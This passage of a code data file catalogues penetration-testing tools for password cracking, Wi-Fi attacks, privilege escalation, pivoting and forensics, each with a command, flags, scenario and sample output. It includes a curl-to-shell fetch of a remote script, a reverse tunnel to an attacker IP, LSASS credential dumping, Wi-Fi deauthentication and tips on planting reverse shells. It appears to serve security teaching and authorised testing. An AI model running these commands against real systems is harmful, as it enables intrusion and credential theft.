    outputExample: `[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344392 login tries
[ATTEMPT] target 192.168.1.50 - login "root" - pass "123456" - 1 of 14344392
[ATTEMPT] target 192.168.1.50 - login "root" - pass "password" - 2 of 14344392
[22][ssh] host: 192.168.1.50   login: root   password: toor
1 of 1 target successfully completed, 1 valid password found`,
    tips: 'Always check if fail2ban is running before running Hydra on SSH to prevent locking your IP out.'
  },
  {
    id: 'pwd-2',
    name: 'john Offline Hash Cracker (John the Ripper)',
    tool: 'john',
    category: 'password',
    description: 'Fast, flexible offline password cracker capable of auto-detecting hash types and applying custom mangling rules.',
    command: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=sha512crypt',
    flags: [
      { flag: '--wordlist=<path>', description: 'Dictionary wordlist' },
      { flag: 'hashes.txt', description: 'File containing captured or extracted hashes' },
      { flag: '--format=sha512crypt', description: 'Explicit hash format (Linux /etc/shadow $6$ format)' }
    ],
    scenario: 'Cracking password hashes extracted from /etc/shadow or database dumps during post-exploitation.',
    noiseLevel: 'stealth',
    phase: 'Credential Access',
    mitreId: 'T1110.002',
    outputExample: `Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragon123        (administrator)     
1g 0:00:00:04 100% 0.2444g/s 1250p/s 1250c/s 1250C/s dragon123..dragon123
Use the "--show" option to display all of the cracked passwords reliably`,
    tips: 'Use unshadow /etc/passwd /etc/shadow > hashes.txt to format Linux shadow files for John.'
  },
  {
    id: 'pwd-3',
    name: 'hashcat GPU-Accelerated NTLM Hash Cracker',
    tool: 'hashcat',
    category: 'password',
    description: 'The world’s fastest and most advanced password recovery utility, harnessing GPU cores to crack billions of hashes per second.',
    command: 'hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O',
    flags: [
      { flag: '-m 1000', description: 'Hash type: 1000 = NTLM (Windows Active Directory hashes)' },
      { flag: '-a 0', description: 'Attack mode: 0 = Straight dictionary attack' },
      { flag: '-r best64.rule', description: 'Apply 64 intelligent mutation rules (capitalization, leetspeak, numbers)' },
      { flag: '-O', description: 'Enable optimized GPU kernel for maximum cracking speed' }
    ],
    scenario: 'Cracking Active Directory NTLM password hashes dumped from NTDS.dit or SAM database during an internal Red Team exercise.',
    noiseLevel: 'stealth',
    phase: 'Credential Access',
    mitreId: 'T1110.002',
    outputExample: `Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: ntlm_hashes.txt
Speed.#1.........: 14250.2 MH/s (util: 98%)
b4b9b02e6f09a9bd760f388b67351e2b:Winter2024!
Candidates.#1....: Winter2024! -> Winter2024!
Approaching 100% completion`,
    tips: 'Mode 0 = MD5, 1000 = NTLM, 1800 = sha512crypt ($6$), 22000 = WPA-PBKDF2-PMKID/EAPOL.'
  },
  {
    id: 'pwd-4',
    name: 'cewl Custom Spidering Wordlist Generator',
    tool: 'cewl',
    category: 'password',
    description: 'Spiders a target URL to a given depth and extracts unique words to create highly targeted custom wordlists based on the company’s own vocabulary.',
    command: 'cewl https://target.com -d 2 -m 6 -w custom_wordlist.txt',
    flags: [
      { flag: 'https://target.com', description: 'Target website to spider' },
      { flag: '-d 2', description: 'Spider depth (follow links up to 2 levels deep)' },
      { flag: '-m 6', description: 'Minimum word length (skip words shorter than 6 letters)' },
      { flag: '-w custom_wordlist.txt', description: 'Save generated wordlist to file' }
    ],
    scenario: 'Creating company-specific password dictionaries before cracking hashes or brute-forcing portals, capitalizing on corporate jargon and product names.',
    noiseLevel: 'low',
    phase: 'Weaponization',
    mitreId: 'T1589.001',
    outputExample: `CeWL 5.5.2 (Custom Word List generator)
Robin Wood (robin@digi.ninja) (https://digi.ninja/)

Visiting: https://target.com
Visiting: https://target.com/about-us
Visiting: https://target.com/products
Writing 1,482 unique words to custom_wordlist.txt...`,
    tips: 'Combine with hashcat rules (-r) to automatically append year numbers (e.g., CompanyName2026!).'
  },

  // --- WIRELESS ---
  {
    id: 'wifi-1',
    name: 'airmon-ng Enable Wi-Fi Monitor Mode',
    tool: 'airmon-ng',
    category: 'wireless',
    description: 'Configures wireless network card into monitor mode (RFMON) to capture raw 802.11 frames from the air.',
    command: 'airmon-ng check kill && airmon-ng start wlan0',
    flags: [
      { flag: 'check kill', description: 'Kills interfering network processes (NetworkManager, wpa_supplicant)' },
      { flag: 'start wlan0', description: 'Enables monitor mode on interface wlan0 (creates wlan0mon)' }
    ],
    scenario: 'First step in any 802.11 wireless security audit to allow the Wi-Fi card to listen to all nearby wireless packets.',
    noiseLevel: 'stealth',
    phase: 'Reconnaissance',
    mitreId: 'T1040',
    outputExample: `Killing these processes:
  PID Name
  712 NetworkManager
  845 wpa_supplicant
PHY  Interface  Driver    Chipset
phy0 wlan0      ath9k_htc Qualcomm Atheros AR9271
(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)`,
    tips: 'Use an external USB Wi-Fi adapter that supports packet injection (e.g., Atheros AR9271, Realtek RTL8812AU).'
  },
  {
    id: 'wifi-2',
    name: 'airodump-ng Wi-Fi Traffic & Handshake Capture',
    tool: 'airodump-ng',
    category: 'wireless',
    description: 'Displays 802.11 access points and connected clients, and captures the WPA/WPA2 4-way authentication handshake.',
    command: 'airodump-ng -w capture --bssid 00:11:22:33:44:55 -c 6 wlan0mon',
    flags: [
      { flag: '-w capture', description: 'File prefix for saved pcap/cap files' },
      { flag: '--bssid 00:11:22:...', description: 'Filter capture to specific Access Point MAC address' },
      { flag: '-c 6', description: 'Lock wireless card to target channel 6' },
      { flag: 'wlan0mon', description: 'Wireless monitor mode interface' }
    ],
    scenario: 'Sniffing wireless frames to capture an authentic WPA2 4-way authentication handshake between a laptop and access point.',
    noiseLevel: 'stealth',
    phase: 'Credential Access',
    mitreId: 'T1040',
    outputExample: `CH  6 ][ Elapsed: 45 s ][ 2026-09-19 11:30 ][ WPA handshake: 00:11:22:33:44:55

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 00:11:22:33:44:55  -42 100      412      892   12   6  54e  WPA2 CCMP   PSK  Corp_WiFi

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 00:11:22:33:44:55  AA:BB:CC:DD:EE:FF  -35   54e -24     0       45`,
    tips: 'Look for the message "[ WPA handshake: XX:XX:XX:XX:XX:XX ]" in the top right corner — this means the handshake is captured!'
  },
  {
    id: 'wifi-3',
    name: 'aireplay-ng Wi-Fi Deauthentication Attack',
    tool: 'aireplay-ng',
    category: 'wireless',
    description: 'Generates and injects 802.11 management frames to disconnect clients from an AP, forcing them to reconnect and re-send the 4-way handshake.',
    command: 'aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon',
    flags: [
      { flag: '--deauth 10', description: 'Send 10 deauthentication frames' },
      { flag: '-a <bssid>', description: 'Access Point MAC address' },
      { flag: '-c <client-mac>', description: 'Target client station MAC address to disconnect' },
      { flag: 'wlan0mon', description: 'Monitor interface' }
    ],
    scenario: 'Speeding up WPA2 handshake capture by briefly disconnecting a client so they automatically reconnect.',
    noiseLevel: 'noisy',
    phase: 'Exploitation',
    mitreId: 'T1498',
    outputExample: `11:30:15  Waiting for beacon frame (BSSID: 00:11:22:33:44:55) on channel 6
11:30:15  Sending 64 directed Deauth (code 7) - ST@ [AA:BB:CC:DD:EE:FF] [ 8| 9 ACKs]
11:30:16  Sending 64 directed Deauth (code 7) - ST@ [AA:BB:CC:DD:EE:FF] [10|10 ACKs]`,
    tips: 'Avoid sending 0 (continuous deauth) in client tests as it causes a complete denial-of-service.'
  },
  {
    id: 'wifi-4',
    name: 'aircrack-ng WPA/WPA2 Handshake Cracker',
    tool: 'aircrack-ng',
    category: 'wireless',
    description: '802.11 WEP and WPA/WPA2-PSK key recovery tool using dictionary attacks against captured 4-way handshakes.',
    command: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 capture-01.cap',
    flags: [
      { flag: '-w <wordlist>', description: 'Wordlist dictionary to test' },
      { flag: '-b <bssid>', description: 'BSSID of target network' },
      { flag: 'capture-01.cap', description: 'Capture file containing the 4-way handshake' }
    ],
    scenario: 'Recovering the Pre-Shared Key (PSK) Wi-Fi password offline without further wireless interaction.',
    noiseLevel: 'stealth',
    phase: 'Credential Access',
    mitreId: 'T1110.002',
    outputExample: `                                 Aircrack-ng 1.7 

                   [00:01:24] 154201/14344392 keys tested (1824.12 k/s)

                         KEY FOUND! [ CorporateWifi2026 ]

      Master Key     : 4B 89 2A 1F C9 22 A8 0B 77 E3 8C 12 90 AA B1 55
      Transient Key  : 00 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF
      EAPOL HMAC     : 1A 2B 3C 4D 5E 6F 7A 8B 9C 0D 1E 2F 3A 4B 5C 6D`,
    tips: 'For 100x faster cracking, convert the .cap file to .hc22000 using hcxpcapngtool and crack with hashcat on a GPU.'
  },

  // --- PRIVESC & POST-EXPLOIT ---
  {
    id: 'priv-1',
    name: 'linpeas.sh Linux Privilege Escalation Engine',
    tool: 'linpeas',
    category: 'privesc',
    description: 'Automated script that searches for possible paths to escalate privileges on Linux/Unix hosts: SUID binaries, cron jobs, sudo rights, and kernel exploits.',
    command: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
    flags: [
      { flag: 'curl -L <url>', description: 'Stream script directly from official GitHub release into memory' },
      { flag: '| sh', description: 'Pipe and execute in standard shell without touching disk' }
    ],
    scenario: 'First post-exploitation step upon obtaining a low-privilege shell (e.g. www-data) on a Linux server to identify a quick path to root.',
    noiseLevel: 'low',
    phase: 'Privilege Escalation',
    mitreId: 'T1068 / T1548',
    outputExample: `════════════════════════════════════╣ Check Sudo permissions ╠════════════════════════════════════
User www-data may run the following commands on target:
    (ALL : ALL) NOPASSWD: /usr/bin/find

════════════════════════════════════╣ Check SUID Files ╠════════════════════════════════════
-rwsr-xr-x 1 root root 51K Feb 21  2024 /usr/bin/pkexec ---> Vulnerable to PwnKit (CVE-2021-4034)!`,
    tips: 'Pay special attention to RED/YELLOW highlighting in linpeas output — 95% of the time, that is your direct path to root.'
  },
  {
    id: 'priv-2',
    name: 'chisel Reverse SOCKS Tunneling',
    tool: 'chisel',
    category: 'privesc',
    description: 'Fast TCP/UDP tunnel over HTTP secured via SSH. Creates reverse SOCKS5 proxies to route traffic into internal segmented corporate networks.',
    command: 'chisel client 10.10.14.5:8000 R:socks',
    flags: [
      { flag: 'client', description: 'Run in client mode on the compromised target machine' },
      { flag: '10.10.14.5:8000', description: 'Attacker Chisel server IP and listening port' },
      { flag: 'R:socks', description: 'Reverse SOCKS5 proxy (opens port 1080 on attacker machine to route into target network)' }
    ],
    scenario: 'Pivoting from a compromised DMZ web server into the internal Active Directory subnet using proxychains.',
    noiseLevel: 'low',
    phase: 'Lateral Movement',
    mitreId: 'T1572',
    outputExample: `2026/09/19 11:35:10 client: Connecting to ws://10.10.14.5:8000
2026/09/19 11:35:11 client: Handshaking...
2026/09/19 11:35:11 client: Sending config
2026/09/19 11:35:11 client: Connected (Latency 18.2ms)
2026/09/19 11:35:11 client: tun: Bound reverse socks proxy to remote port 1080`,
    tips: 'Configure /etc/proxychains4.conf with socks5 127.0.0.1 1080 to run any Kali tool through the compromised machine.'
  },
  {
    id: 'priv-3',
    name: 'pypykatz LSASS Memory Credential Dump',
    tool: 'pypykatz',
    category: 'privesc',
    description: 'Pure Python implementation of Mimikatz. Parses Windows LSASS memory dumps offline on Kali Linux to extract cleartext passwords and NTLM hashes.',
    command: 'pypykatz lsa minidump lsass.dmp',
    flags: [
      { flag: 'lsa minidump', description: 'Parse Local Security Authority Subsystem Service minidump file' },
      { flag: 'lsass.dmp', description: 'Memory dump file obtained from Windows target' }
    ],
    scenario: 'Dumping credentials offline on Kali without running noisy mimikatz.exe on the target Windows box, bypassing EDR/AV detections.',
    noiseLevel: 'stealth',
    phase: 'Credential Access',
    mitreId: 'T1003.001',
    outputExample: `FILE: lsass.dmp
========== MSV ==========
AuthenticationId: 0;149282
PackageName: NTLM
UserName: Administrator
DomainName: CORP
LogonServer: DC01
LogonTime: 2026-09-19 09:12:01
LM: NA
NT: 31d6cfe0d16ae931b73c59d7e0c089c0
SHA1: 251978...

========== WDIGEST ==========
UserName: svc_backup
Password: BackupMasterPassword2026!`,
    tips: 'Dump LSASS on Windows using Task Manager (Create Dump File) or procdump64.exe -ma lsass.exe lsass.dmp.'
  },
  {
    id: 'priv-4',
    name: 'pspy Linux Process Snoop without Root',
    tool: 'pspy',
    category: 'privesc',
    description: 'Command line tool designed to snoop on Linux processes without need for root permissions. Captures short-lived cron jobs and arguments.',
    command: './pspy64 -pf -i 1000',
    flags: [
      { flag: '-pf', description: 'Print file system events alongside process creations' },
      { flag: '-i 1000', description: 'Scan interval in milliseconds (1000ms = 1s)' }
    ],
    scenario: 'Catching hidden scheduled cron jobs passing passwords in command line arguments (e.g., mysql -u root -pPassword123).',
    noiseLevel: 'stealth',
    phase: 'Discovery',
    mitreId: 'T1057',
    outputExample: `2026/09/19 11:40:01 CMD: UID=0    PID=4812   | /bin/sh /opt/scripts/backup.sh
2026/09/19 11:40:01 CMD: UID=0    PID=4813   | /usr/bin/tar -czf /var/backups/data.tar.gz /var/www/html
2026/09/19 11:40:02 CMD: UID=0    PID=4815   | scp /var/backups/data.tar.gz backup@192.168.1.10:/backup`,
    tips: 'If backup.sh is writable by your user, you can inject a reverse shell to gain root automatically!'
  },
  {
    id: 'priv-5',
    name: 'find SUID Binaries Enumeration',
    tool: 'find',
    category: 'privesc',
    description: 'Searches the entire Linux filesystem for binaries with the SUID bit set, allowing execution with the file owner’s (root) permissions.',
    command: 'find / -perm -u=s -type f 2>/dev/null',
    flags: [
      { flag: '/', description: 'Start search from root directory' },
      { flag: '-perm -u=s', description: 'Match files where the SUID permission bit is set' },
      { flag: '-type f', description: 'Search only for regular files' },
      { flag: '2>/dev/null', description: 'Discard standard error (permission denied errors)' }
    ],
    scenario: 'Finding misconfigured administrative binaries (e.g. bash, nmap, vim, python, find) that allow instant root privilege escalation via GTFOBins.',
    noiseLevel: 'stealth',
    phase: 'Privilege Escalation',
    mitreId: 'T1548.001',
    outputExample: `/usr/bin/su
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/local/bin/vim  <--- SUID on VIM! Direct root escalation possible: vim -c ':!/bin/sh'`,
    tips: 'Always cross-reference SUID findings with gtfobins.github.io to find the exact bypass command.'
  },

  // --- FORENSICS & REVERSING ---
  {
    id: 'for-1',
    name: 'binwalk Firmware Analysis & Extraction',
    tool: 'binwalk',
    category: 'forensics',
    description: 'Fast tool for analyzing, reverse engineering, and extracting embedded file systems and executable code from binary firmware images.',
    command: 'binwalk -e -M firmware.bin',
    flags: [
      { flag: '-e', description: 'Automatically extract known file types found inside the image' },
      { flag: '-M', description: 'Recursively scan extracted files (Matryoshka mode)' },
      { flag: 'firmware.bin', description: 'Target binary firmware or disk image' }
    ],
    scenario: 'IoT and hardware penetration testing: extracting the Linux root filesystem from router or camera firmware to inspect shadow hashes and hardcoded API keys.',
    noiseLevel: 'stealth',
    phase: 'Forensics',
    mitreId: 'T1005',
    outputExample: `DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             uImage header, header size: 64 bytes
64            0x40            gzip compressed data, maximum compression
1310784       0x140040        Squashfs filesystem, little endian, version 4.0, size: 4812391 bytes
Extracted: _firmware.bin.extracted/squashfs-root/etc/shadow`,
    tips: 'Check _firmware.bin.extracted/squashfs-root/etc/passwd and /etc/shadow for hardcoded backdoor accounts.'
  },
  {
    id: 'for-2',
    name: 'volatility Memory Forensics Analysis',
    tool: 'volatility',
    category: 'forensics',
    description: 'Advanced memory forensics framework for incident response and malware analysis from volatile RAM dumps.',
    command: 'volatility -f memory.raw --profile=Win10x64_19041 pslist',
    flags: [
      { flag: '-f memory.raw', description: 'Raw memory dump image' },
      { flag: '--profile=<profile>', description: 'OS kernel profile for structure offset resolution' },
      { flag: 'pslist', description: 'Plugin to walk the active process list' }
    ],
    scenario: 'Investigating a ransomware attack or rootkit injection during a blue team incident response engagement.',
    noiseLevel: 'stealth',
    phase: 'Forensics',
    mitreId: 'T1057',
    outputExample: `Volatility Foundation Volatility Framework 2.6.1
Offset(V)          Name                    PID   PPID   Thds     Hnds   Time
------------------ -------------------- ------ ------ ------ -------- -------------------
0xffff8001a1e80080 System                    4      0    162        0 2026-09-19 08:00:00
0xffff8001a4f9b080 smss.exe                384      4      2       32 2026-09-19 08:00:02
0xffff8001a6730080 svchost.exe            1244    648     14      410 2026-09-19 08:01:15
0xffff8001a892b080 evil_beacon.exe        4812   1244      4       89 2026-09-19 09:14:22`,
    tips: 'Use malfind plugin to detect hidden or injected shellcode in process memory segments.'
  },
  {
    id: 'for-3',
    name: 'exiftool Metadata Inspector & Cleaner',
    tool: 'exiftool',
    category: 'forensics',
    description: 'Reads, writes, and manipulates image, audio, video, and PDF metadata. Crucial for privacy and OSINT.',
    command: 'exiftool -all= -overwrite_original confidential_report.pdf',
    flags: [
      { flag: '-all=', description: 'Delete all metadata tags (author, GPS coordinates, camera model, timestamps)' },
      { flag: '-overwrite_original', description: 'Overwrite the file directly without creating a _original backup' }
    ],
    scenario: 'Sanitizing documents before public release or inspecting photos recovered during OSINT to extract exact GPS coordinates.',
    noiseLevel: 'stealth',
    phase: 'Forensics',
    mitreId: 'T1005',
    outputExample: `    1 image files updated
All metadata removed:
- Author: John Doe
- Creator: Microsoft Word 2021
- GPS Position: 37 deg 46' 29.88" N, 122 deg 25' 9.84" W (San Francisco, CA)
- Modify Date: 2026:09:19 10:14:02`,
    tips: 'Run exiftool image.jpg without flags to view all hidden EXIF, IPTC, and XMP metadata.'
  },
  {
    id: 'for-4',
    name: 'strings Binary Printable Character Extractor',
    tool: 'strings',
    category: 'forensics',
    description: 'Finds and prints printable strings of characters in binary files. Essential for rapid initial triage of unknown malware binaries.',
    command: 'strings -a -n 8 malware_sample.exe | grep -E "http|https|cmd\\.exe|powershell|\\.dll"',
    flags: [
      { flag: '-a', description: 'Scan the entire file, not just initialized data sections' },
      { flag: '-n 8', description: 'Minimum string length of 8 characters' },
      { flag: '| grep -E "..."', description: 'Filter output for C2 URLs, system commands, and imported DLLs' }
    ],
    scenario: 'Rapid static analysis of an email attachment to extract hardcoded Command & Control (C2) domains and dropped filenames.',
    noiseLevel: 'stealth',
    phase: 'Forensics',
    mitreId: 'T1027',
    outputExample: `http://c2-beacon.darknet-relay.org/api/v1/heartbeat
https://pastebin.com/raw/d8s7df2
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc
KERNEL32.dll
VirtualAllocEx
WriteProcessMemory`,
    tips: 'Combine with -e l to extract 16-bit little-endian Unicode strings common in Windows executables.'
  },
  {
    id: 'for-5',
    name: 'radare2 Advanced Binary Disassembler & Debugger',
    tool: 'radare2',
    category: 'forensics',
    description: 'Complete, multi-architecture reverse engineering framework for disassembling, analyzing, patching, and debugging binaries.',
    command: 'r2 -A ./crackme_binary',
    flags: [
      { flag: '-A', description: 'Automatically run complete analysis (aaa) upon loading the binary' },
      { flag: './crackme_binary', description: 'Binary target file' }
    ],
    scenario: 'Reverse engineering malware or software protection schemes to find hardcoded passwords or patch license verification checks.',
    noiseLevel: 'stealth',
    phase: 'Forensics',
    mitreId: 'T1027',
    outputExample: `[x] Analyze all flags prefixed with flag.annotated (aa)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis
 -- It's not a bug, it's an undocumented feature.
[0x00001140]> afl
0x00001140    1 42           entry0
0x00001180    4 72           sym.check_password
0x000011d0    3 58           main
[0x00001140]> pdf @ sym.check_password`,
    tips: 'Use the visual interactive graph mode inside r2 by pressing V then p.'
  },

  // --- SNIFFING, PIVOTING & UTILITIES ---
  {
    id: 'piv-1',
    name: 'tcpdump Command-Line Packet Analyzer',
    tool: 'tcpdump',
    category: 'pivoting',
    description: 'The premier command-line packet analyzer. Captures TCP/IP packets passing through network interfaces for deep protocol analysis.',
    command: 'tcpdump -i eth0 -nn -s0 -v "port 80 or port 443" -w web_traffic.pcap',
    flags: [
      { flag: '-i eth0', description: 'Network interface to capture from' },
      { flag: '-nn', description: 'Do not resolve hostnames or port numbers (improves performance)' },
      { flag: '-s0', description: 'Capture full packet snapshot length (no packet truncation)' },
      { flag: '-v', description: 'Verbose protocol decoding' },
      { flag: '"port 80 or port 443"', description: 'Berkeley Packet Filter (BPF) syntax' },
      { flag: '-w web_traffic.pcap', description: 'Write raw packets to pcap file for Wireshark analysis' }
    ],
    scenario: 'Troubleshooting exploit delivery, capturing credentials transmitted over unencrypted protocols, and verifying network egress filtering.',
    noiseLevel: 'stealth',
    phase: 'Collection',
    mitreId: 'T1040',
    outputExample: `tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
11:45:10.123456 IP 192.168.1.100.54321 > 192.168.1.50.80: Flags [P.], seq 1:245, ack 1
11:45:10.124567 IP 192.168.1.50.80 > 192.168.1.100.54321: Flags [.], ack 245
^C
142 packets captured
142 packets received by filter
0 packets dropped by kernel`,
    tips: 'Use -A flag to print packet contents in ASCII to watch HTTP headers and cleartext data stream live.'
  },
  {
    id: 'piv-2',
    name: 'tshark Headless Network Protocol Analyzer',
    tool: 'tshark',
    category: 'pivoting',
    description: 'Terminal-oriented version of Wireshark. Allows packet capture and analysis directly in scripts and remote servers.',
    command: 'tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e ip.src -e http.host -e http.file_data',
    flags: [
      { flag: '-r capture.pcap', description: 'Read packets from saved pcap file' },
      { flag: '-Y "<filter>"', description: 'Wireshark display filter syntax' },
      { flag: '-T fields', description: 'Format output as tab-separated fields' },
      { flag: '-e <field>', description: 'Select specific protocol fields to output (Source IP, Host, POST data)' }
    ],
    scenario: 'Automated extraction of credentials, session cookies, and submitted form data from massive network traffic captures.',
    noiseLevel: 'stealth',
    phase: 'Collection',
    mitreId: 'T1040',
    outputExample: `192.168.1.105   portal.target.com   user=admin&password=SuperSecretPassword!&login=Submit
192.168.1.112   api.target.com      {"auth_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}`,
    tips: 'Combine with tshark -z io,phs to print a complete protocol hierarchy statistics tree of the capture.'
  },
  {
    id: 'piv-3',
    name: 'nc (netcat) The TCP/IP Swiss Army Knife',
    tool: 'netcat',
    category: 'pivoting',
    description: 'Reads and writes data across network connections using TCP or UDP. Used for port scanning, file transfers, and catching reverse shells.',
    command: 'nc -lvnp 4444',
    flags: [
      { flag: '-l', description: 'Listen mode, for inbound connections' },
      { flag: '-v', description: 'Verbose output' },
      { flag: '-n', description: 'Numeric-only IP addresses, no DNS lookups' },
      { flag: '-p 4444', description: 'Local port number to bind to' }
    ],
    scenario: 'The most universal command to catch incoming reverse shells spawned from exploited web applications, buffer overflows, or command injections.',
    noiseLevel: 'low',
    phase: 'Execution',
    mitreId: 'T1059',
    outputExample: `listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [192.168.1.50] 49152
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uname -a
Linux web-prod 5.15.0-88-generic #98-Ubuntu SMP x86_64 GNU/Linux`,
    tips: 'Upgrade dumb netcat shell to full PTY terminal: python3 -c \'import pty; pty.spawn("/bin/bash")\', then press Ctrl+Z and run stty raw -echo; fg.'
  },
  {
    id: 'piv-4',
    name: 'socat Bidirectional Relay & Port Forwarder',
    tool: 'socat',
    category: 'pivoting',
    description: 'Multipurpose relay tool that establishes two bidirectional byte streams and transfers data between them. Supercharges netcat capabilities.',
    command: 'socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80',
    flags: [
      { flag: 'TCP-LISTEN:8080', description: 'Open local TCP listener on port 8080' },
      { flag: 'fork', description: 'Handle multiple concurrent client connections by spawning sub-processes' },
      { flag: 'TCP:192.168.1.100:80', description: 'Forward all received traffic directly to internal target web server' }
    ],
    scenario: 'Port forwarding traffic through a compromised pivot machine to access an internal private network service otherwise unreachable from your Kali box.',
    noiseLevel: 'low',
    phase: 'Lateral Movement',
    mitreId: 'T1090',
    outputExample: `2026/09/19 11:50:00 socat[4120] N listening on AF=2 0.0.0.0:8080
2026/09/19 11:50:14 socat[4120] N accepting connection from AF=2 10.10.14.5:51234
2026/09/19 11:50:14 socat[4121] N opening connection to AF=2 192.168.1.100:80
2026/09/19 11:50:14 socat[4121] N starting data transfer loop`,
    tips: 'Socat can spawn encrypted TTY shells directly with SSL certificates: socat OPENSSL-LISTEN:4443,cert=cert.pem,verify=0 FILE:`tty`,raw,echo=0.'
  }
];
